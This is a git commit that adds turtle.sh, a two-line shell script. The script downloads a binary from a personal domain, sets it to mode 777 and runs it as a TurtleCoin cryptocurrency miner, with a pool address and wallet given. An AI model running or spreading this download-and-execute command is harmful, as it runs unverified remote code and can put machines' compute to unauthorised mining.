7f7b42268f475b2b5749b512630f38cfaeb0f9e1
nanung <81861334+surtitedjohadiningrat@users.noreply.github.com>
2021-07-22 06:39:33 +0700

    Create turtle.sh

---
+++ turtle.sh
@@ -0,0 +1,2 @@
+# turtle
+wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o turtlecoin.herominers.com:10380 -u TRTLv11jVfE8pG6joSABXzLi4fpq694dXGF91RFJ6nuMf2AJuSRa7CSF2i8siF1BGgfF7fYUjnGt4P22T2sLQRzyK8Cooo7PUrB -p nanung -a argon2/chukwav2 -k
